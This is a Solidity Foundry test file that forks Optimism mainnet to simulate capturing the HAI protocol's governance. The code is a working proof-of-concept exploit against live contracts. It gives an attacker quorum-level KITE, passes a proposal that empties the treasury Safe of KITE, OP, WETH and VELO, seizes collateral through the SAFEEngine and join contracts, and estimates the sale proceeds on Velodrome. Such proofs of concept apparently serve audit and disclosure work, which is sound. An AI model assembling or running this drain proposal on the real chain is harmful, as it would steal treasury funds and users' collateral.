// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

interface IVotes is IERC20 {
    function delegate(address) external;
    function getVotes(address) external view returns (uint256);
    function getPastVotes(address, uint256) external view returns (uint256);
    function getPastTotalSupply(uint256) external view returns (uint256);
}

interface IGovernor {
    function propose(address[] memory, uint256[] memory, bytes[] memory, string memory)
        external returns (uint256);
    function castVote(uint256, uint8) external returns (uint256);
    function state(uint256) external view returns (uint8);
    function queue(address[] memory, uint256[] memory, bytes[] memory, bytes32) external returns (uint256);
    function execute(address[] memory, uint256[] memory, bytes[] memory, bytes32) external payable returns (uint256);
    function proposalSnapshot(uint256) external view returns (uint256);
    function proposalDeadline(uint256) external view returns (uint256);
    function proposalVotes(uint256) external view returns (uint256, uint256, uint256);
    function quorum(uint256) external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function votingDelay() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function timelock() external view returns (address);
    function clock() external view returns (uint48);
}

interface ITimelock {
    function getMinDelay() external view returns (uint256);
    function hasRole(bytes32, address) external view returns (bool);
}

interface ISafe {
    function execTransaction(
        address to, uint256 value, bytes calldata data, uint8 operation,
        uint256 safeTxGas, uint256 baseGas, uint256 gasPrice,
        address gasToken, address refundReceiver, bytes calldata signatures
    ) external payable returns (bool);
    function approveHash(bytes32) external;
    function getTransactionHash(
        address to, uint256 value, bytes memory data, uint8 operation,
        uint256 safeTxGas, uint256 baseGas, uint256 gasPrice,
        address gasToken, address refundReceiver, uint256 _nonce
    ) external view returns (bytes32);
    function nonce() external view returns (uint256);
    function getThreshold() external view returns (uint256);
    function getOwners() external view returns (address[] memory);
}

interface ISAFEEngine {
    function modifyCollateralBalance(bytes32, address, int256) external;
    function authorizedAccounts(address) external view returns (bool);
}

interface IJoin {
    function exit(address, uint256) external;
    function collateral() external view returns (address);
    function multiplier() external view returns (uint256);
    function safeEngine() external view returns (address);
}

contract HaiCaptureTest is Test {
    // ---- Optimism mainnet addresses (read from chain at FORK_BLOCK) ----
    address constant GOV    = 0xe807f3282f3391d237BA8B9bECb0d8Ea3ba23777;
    address constant TL     = 0xd68e7D20008a223dD48A6076AAf5EDd4fe80a899;
    address constant SAFE   = 0xDCb421Cc4Cbb7267F3b2cAcAb44Ec18AEbEd6724;
    address constant KITE   = 0xf467C7d5a4A9C4687fFc7986aC6aD5A4c81E1404;
    address constant OP     = 0x4200000000000000000000000000000000000042;
    address constant WETH   = 0x4200000000000000000000000000000000000006;
    address constant VELO   = 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db;
    address constant HAI    = 0x10398AbC267496E49106B07dd6BE13364D10dC71;

    address constant SAFE_ENGINE = 0x9Ff826860689483181C5FAc9628fd2F70275A700;
    address constant JOIN_WETH   = 0xbE57D71e81F83a536937f07E0B3f48dd6f55376B;
    address constant JOIN_WSTETH = 0x77a82b65F8FA7da357A047B897C0339bD0B0B361;
    address constant JOIN_TBTC   = 0x99E2b46c584382D9668a1DBc64A9a23D2828F74B;

    uint256 constant FORK_BLOCK = 159_336_206;

    uint256 constant TREASURY_KITE = 328_143_981253588267391953;
    uint256 constant QUORUM_KITE   = 48_698_350000000000000000; // 5% of 973,967e18
    uint256 constant THRESHOLD     = 20_000e18;
    uint256 constant DEFENDER_VOTES = 122_424e18; // live delegate bloc (5 delegates)

    address attacker = address(0xA77AC4);
    address defender = 0x297BF847Dcb01f3e870515628b36EAbad491e5E8; // live top delegate (52.2k)
    address defender2 = 0xCAFd432b7EcAfff352D92fcB81c60380d437E99D; // live defender (41.6k)
    address defender3 = 0xBad58e133138549936D2576ebC33251bE841d3e9; // live defender (20.9k)
    address defender4 = 0x35d067D337Dd3F7E2BBb4367bed467DCfae1E1fb; // live defender (4.0k)
    address defender5 = 0x9492510BbCB93B6992d8b7Bb67888558E12DCac4; // live defender (3.7k)

    uint256 forkBlock;

    function setUp() public {
        string memory rpc = vm.envOr("OP_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://mainnet.optimism.io";
        // use a recent, stable block that every public RPC can still serve state for
        vm.createSelectFork(rpc);
        uint256 tip = block.number;
        forkBlock = tip - 20;
        vm.createSelectFork(rpc, forkBlock);

        console2.log("fork block:", forkBlock);
        console2.log("chain id:", block.chainid);
        vm.label(GOV, "HaiGovernor");
        vm.label(TL, "Timelock");
        vm.label(SAFE, "TreasurySafe");
        vm.label(KITE, "KITE");
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------

    function _giveKite(address to, uint256 amount) internal {
        deal(KITE, to, amount);
        vm.prank(to);
        IVotes(KITE).delegate(to);
    }

    function _safeTxHash(address token, uint256 amount, uint256 nonce) internal view returns (bytes32) {
        return ISafe(SAFE).getTransactionHash(
            token, 0, abi.encodeWithSelector(IERC20.transfer.selector, attacker, amount),
            0, 0, 0, 0, address(0), address(0), nonce
        );
    }

    /// builds the 4-call drain (KITE, OP, WETH, VELO) = 8 timelock calls (approveHash + exec)
    function _buildDrain()
        internal
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas)
    {
        address[4] memory toks = [KITE, OP, WETH, VELO];
        uint256[4] memory amts = [
            IERC20(KITE).balanceOf(SAFE),
            IERC20(OP).balanceOf(SAFE),
            IERC20(WETH).balanceOf(SAFE),
            IERC20(VELO).balanceOf(SAFE)
        ];
        uint256 nonce = ISafe(SAFE).nonce();

        targets = new address[](8);
        values = new uint256[](8);
        calldatas = new bytes[](8);

        for (uint256 i = 0; i < 4; i++) {
            bytes32 h = _safeTxHash(toks[i], amts[i], nonce + i);
            targets[i * 2] = SAFE;
            calldatas[i * 2] = abi.encodeWithSelector(ISafe.approveHash.selector, h);

            bytes memory sig = abi.encodePacked(bytes32(uint256(uint160(TL))), bytes32(0), uint8(1));
            targets[i * 2 + 1] = SAFE;
            calldatas[i * 2 + 1] = abi.encodeWithSelector(
                ISafe.execTransaction.selector,
                toks[i], 0, abi.encodeWithSelector(IERC20.transfer.selector, attacker, amts[i]),
                0, 0, 0, 0, address(0), address(0), sig
            );
        }
    }

    function _passProposal() internal returns (uint256 id, bytes32 descHash) {
        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = _buildDrain();
        string memory desc = "capture";
        descHash = keccak256(bytes(desc));

        vm.warp(block.timestamp + 2);
        vm.prank(attacker);
        id = IGovernor(GOV).propose(targets, values, calldatas, desc);

        uint256 snap = IGovernor(GOV).proposalSnapshot(id);
        vm.warp(snap + 1);
        vm.prank(attacker);
        IGovernor(GOV).castVote(id, 1); // For

        uint256 dl = IGovernor(GOV).proposalDeadline(id);
        vm.warp(dl + 1);
    }

    // ------------------------------------------------------------------
    // TEST 1: quorum-only capture, nobody votes against -> PASSES
    // ------------------------------------------------------------------

    function test_01_quorum_only_capture_passes() public {
        _giveKite(attacker, QUORUM_KITE);
        assertEq(IVotes(KITE).getVotes(attacker), QUORUM_KITE, "votes");

        (uint256 id,) = _passProposal();
        assertEq(IGovernor(GOV).state(id), 4, "Succeeded"); // 4=Succeeded

        // OZ GovernorCountingSimple returns (againstVotes, forVotes, abstainVotes)
        (uint256 against, uint256 forn, uint256 ab) = IGovernor(GOV).proposalVotes(id);
        console2.log("Against/For/Abstain:", against, forn, ab);
        assertEq(forn, QUORUM_KITE);
        assertEq(against, 0);
        assertEq(IGovernor(GOV).quorum(IGovernor(GOV).proposalSnapshot(id)), QUORUM_KITE);

        console2.log("state before execute: Succeeded; queueing");
        (address[] memory t, uint256[] memory v, bytes[] memory c) = _buildDrain();
        bytes32 dh = keccak256("capture");
        IGovernor(GOV).queue(t, v, c, dh);
        vm.warp(block.timestamp + ITimelock(TL).getMinDelay() + 1);
        IGovernor(GOV).execute(t, v, c, dh);

        uint256 got = IERC20(KITE).balanceOf(attacker) - QUORUM_KITE;
        console2.log("attacker captured KITE:", got);
        assertEq(got, TREASURY_KITE, "treasury KITE captured");
        assertEq(IERC20(KITE).balanceOf(SAFE), 0, "safe empty");
    }

    // ------------------------------------------------------------------
    // TEST 2: quorum-only capture vs live defender bloc -> DEFEATED
    // ------------------------------------------------------------------

    function test_02_quorum_only_capture_defeated_by_live_bloc() public {
        _giveKite(attacker, QUORUM_KITE);

        (address[] memory t, uint256[] memory v, bytes[] memory c) = _buildDrain();
        string memory desc = "capture";
        bytes32 dh = keccak256(bytes(desc));

        vm.warp(block.timestamp + 2);
        vm.prank(attacker);
        uint256 id = IGovernor(GOV).propose(t, v, c, desc);
        vm.warp(IGovernor(GOV).proposalSnapshot(id) + 1);
        vm.prank(attacker);
        IGovernor(GOV).castVote(id, 1);

        // live delegate bloc votes Against with its real (undealt) voting power
        vm.prank(defender);  IGovernor(GOV).castVote(id, 0);
        vm.prank(defender2); IGovernor(GOV).castVote(id, 0);
        vm.prank(defender3); IGovernor(GOV).castVote(id, 0);
        vm.prank(defender4); IGovernor(GOV).castVote(id, 0);
        vm.prank(defender5); IGovernor(GOV).castVote(id, 0);

        vm.warp(IGovernor(GOV).proposalDeadline(id) + 1);

        (uint256 against, uint256 forn, uint256 ab) = IGovernor(GOV).proposalVotes(id);
        console2.log("Against:", against);
        console2.log("For:", forn);
        assertEq(IGovernor(GOV).state(id), 3, "Defeated");
        assertGt(against, forn, "defenders outweigh");
        assertGt(against, 120_000e18, "live bloc >= 120k");
    }

    // ------------------------------------------------------------------
    // TEST 3: attacker buys 130k (beats 122.4k bloc) -> PASSES
    // ------------------------------------------------------------------

    function test_03_130k_capture_beats_live_bloc() public {
        _giveKite(attacker, 130_000e18);

        (address[] memory t, uint256[] memory v, bytes[] memory c) = _buildDrain();
        string memory desc = "capture";
        bytes32 dh = keccak256(bytes(desc));

        vm.warp(block.timestamp + 2);
        vm.prank(attacker);
        uint256 id = IGovernor(GOV).propose(t, v, c, desc);
        vm.warp(IGovernor(GOV).proposalSnapshot(id) + 1);
        vm.prank(attacker);
        IGovernor(GOV).castVote(id, 1);
        vm.prank(defender);  IGovernor(GOV).castVote(id, 0);
        vm.prank(defender2); IGovernor(GOV).castVote(id, 0);
        vm.prank(defender3); IGovernor(GOV).castVote(id, 0);
        vm.prank(defender4); IGovernor(GOV).castVote(id, 0);
        vm.prank(defender5); IGovernor(GOV).castVote(id, 0);
        vm.warp(IGovernor(GOV).proposalDeadline(id) + 1);

        (uint256 against, uint256 forn, uint256 ab) = IGovernor(GOV).proposalVotes(id);
        console2.log("Against:", against);
        console2.log("For:", forn);
        assertEq(IGovernor(GOV).state(id), 4, "Succeeded");

        IGovernor(GOV).queue(t, v, c, dh);
        vm.warp(block.timestamp + ITimelock(TL).getMinDelay() + 1);
        IGovernor(GOV).execute(t, v, c, dh);

        assertEq(IERC20(KITE).balanceOf(SAFE), 0, "safe empty");
        uint256 got = IERC20(KITE).balanceOf(attacker) - 130_000e18;
        console2.log("captured KITE (130k scenario):", got);
        console2.log("captured OP:", IERC20(OP).balanceOf(attacker));
    }

    // ------------------------------------------------------------------
    // TEST 4: governance confiscates HAI collateral via SAFEEngine credit
    // ------------------------------------------------------------------

    function test_04_governance_confiscates_collateral() public {
        assertTrue(ISAFEEngine(SAFE_ENGINE).authorizedAccounts(TL), "TL authorized on SAFEEngine");
        assertEq(IJoin(JOIN_WETH).safeEngine(), SAFE_ENGINE, "join engine");

        uint256 wethBal = IERC20(WETH).balanceOf(JOIN_WETH);
        uint256 wstBal  = IERC20(0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb).balanceOf(JOIN_WSTETH);
        uint256 tbtcBal = IERC20(0x6c84a8f1c29108F47a79964b5Fe888D4f4D0dE40).balanceOf(JOIN_TBTC);
        console2.log("WETH in join:", wethBal);
        console2.log("wstETH in join:", wstBal);
        console2.log("TBTC in join:", tbtcBal);

        bytes32 CT_WETH   = bytes32("WETH");
        bytes32 CT_WSTETH = bytes32("WSTETH");
        bytes32 CT_TBTC   = bytes32("TBTC");

        // exactly what a hostile proposal would do: credit internal collateral, then exit to real tokens
        vm.startPrank(TL);
        ISAFEEngine(SAFE_ENGINE).modifyCollateralBalance(CT_WETH, attacker, int256(wethBal));
        ISAFEEngine(SAFE_ENGINE).modifyCollateralBalance(CT_WSTETH, attacker, int256(wstBal));
        ISAFEEngine(SAFE_ENGINE).modifyCollateralBalance(CT_TBTC, attacker, int256(tbtcBal));
        vm.stopPrank();

        vm.startPrank(attacker);
        IJoin(JOIN_WETH).exit(attacker, wethBal);
        IJoin(JOIN_WSTETH).exit(attacker, wstBal);
        IJoin(JOIN_TBTC).exit(attacker, tbtcBal);
        vm.stopPrank();

        assertEq(IERC20(WETH).balanceOf(attacker), wethBal, "WETH seized");
        assertEq(IERC20(0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb).balanceOf(attacker), wstBal, "wstETH seized");
        assertEq(IERC20(0x6c84a8f1c29108F47a79964b5Fe888D4f4D0dE40).balanceOf(attacker), tbtcBal, "TBTC seized");
        console2.log("seized WETH (USD @2127):", (wethBal * 2127) / 1e18);
        console2.log("seized wstETH (USD @2660):", (wstBal * 2660) / 1e18);
    }

    // ------------------------------------------------------------------
    // TEST 5: exit value of captured KITE = the two Velodrome pools
    // ------------------------------------------------------------------

    function test_05_exit_liquidity_is_the_binding_constraint() public view {
        // pool reserves read live at fork
        (uint256 r0, uint256 r1,) = IVelodromePool(0xf2d3941b6E1cbD3616061E556Eb06986147715d1).getReserves();
        (uint256 s0, uint256 s1,) = IVelodromePool(0xf4638dC488F9C826DC40250515592E678E447238).getReserves();
        console2.log("KITE/HAI pool HAI:", r0);
        console2.log("KITE/HAI pool KITE:", r1);
        console2.log("OP/KITE  pool OP :", s0);
        console2.log("OP/KITE  pool KITE:", s1);
        uint256 kiteInPools = r1 + s1;
        console2.log("total KITE in pools:", kiteInPools);
        assertLt(kiteInPools, QUORUM_KITE, "quorum > entire DEX float");

        // constant-product proceeds for dumping the treasury's KITE (30 bp fee)
        uint256 outHai = r0 - (r0 * r1) / (r1 + (TREASURY_KITE * 997) / 1000);
        uint256 outOp  = s0 - (s0 * s1) / (s1 + (TREASURY_KITE * 997) / 1000);
        console2.log("dump 328,143.98 KITE -> HAI:", outHai);
        console2.log("dump 328,143.98 KITE -> OP :", outOp);
    }

    function test_06_state_snapshot_math() public view {
        console2.log("totalSupply:", IVotes(KITE).totalSupply());
        console2.log("quorum 5%:", (IVotes(KITE).totalSupply() * 5) / 100);
        console2.log("treasury KITE / quorum (x100):", (TREASURY_KITE * 100) / QUORUM_KITE);
        assertEq((IVotes(KITE).totalSupply() * 5) / 100, QUORUM_KITE, "quorum");
    }
}

interface IVelodromePool {
    function getReserves() external view returns (uint256, uint256, uint256);
}
